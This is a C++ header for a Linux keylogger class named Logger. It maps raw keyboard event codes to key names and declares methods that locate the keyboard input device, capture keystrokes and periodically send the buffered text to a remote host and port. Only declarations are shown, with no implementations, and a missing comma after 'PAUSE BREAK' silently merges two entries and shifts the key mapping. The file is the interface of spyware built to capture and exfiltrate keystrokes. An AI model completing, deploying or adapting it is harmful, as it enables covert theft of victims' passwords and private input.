#ifndef LOGGER_H_
#define LOGGER_H_

#include <iostream>
#include <fstream>
#include <vector>
#include <regex>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <boost/asio.hpp>
#include <sstream>
#include <thread>
#include <chrono>
#include <atomic>

#define SEND_DATA_INTERVAL 10

class Logger {
private:
    std::string host{};
    std::string port{};

	std::vector<std::string> keyCodes = {
	"KEYBOARD ERROR",
	"ESC",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"BACKSPACE",
	"TAB",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"ENTER",
	"LEFT CNTRL",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"`",
	"LEFT SHIFT",
	"\\",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"RIGHT SHIFT",
	"KP *",
	"LEFT ALT",
	"SPACE",
	"CAPS LOCK",
	"F1",
	"F2",
	"F3",
	"F4",
	"F5",
	"F6",
	"F7",
	"F8",
	"F9",
	"F10",
	"NUM LOCK",
	"SCROLL LOCK",
	"KP HOME 7",
	"KP UP 8",
	"KP PAGE UP 9",
	"KP -",
	"KP LEFT 4",
	"KP 5",
	"KP RIGHT 6",
	"KP +", // Correct
	"KP END 1",
	"KP DOWN 2",
	"KP PAGE DOWN 3", // Correct
	"KP INS 0",
	"KP DEL .", // Correct 83
	"", //84
	"", //85
	"",//86
	"F11", // 87
	"F12", //88
	"", //89
	"",//90
	"",//91
	"", //92
	"", //93
	"", //94
	"", //95
	"KP ENTER", //96
	"RIGHT CNTRL", //97
	"KP /", //98
	"PRINT SCREEN", //99
	"RIGHT ALT", //100
	"", //101
	"HOME",//102
	"UP", //103
	"PAGE UP", //104
	"LEFT", //105
	"RIGHT", //106
	"END",//107
	"DOWN",//108
	"PAGE DOWN",//109
	"INSERT",//110
	"DELETE", //111
	"", //112
	"", //113
	"", //114
	"", //115
	"", //116
	"", //117
	"", //118
	"PAUSE BREAK" //119
	"", //120
	"", //121
	"", //122
	"", //123
	"", //124
	"LEFT META", // 125
	"", //126
	"COMPOSE"//127 RIGHT CLICK MENU
	};


	void connectHandler(std::string& handler, std::string& host, std::string& port);

	void sendBufferToRemoteHost(const std::string& buffer, const std::string& host, const std::string& port);

	std::string getHandler(std::string& devices);

	std::string getDevices();

public:
    Logger(std::string host, std::string port);
	void loggerize();

};

#endif //LOGGER_H_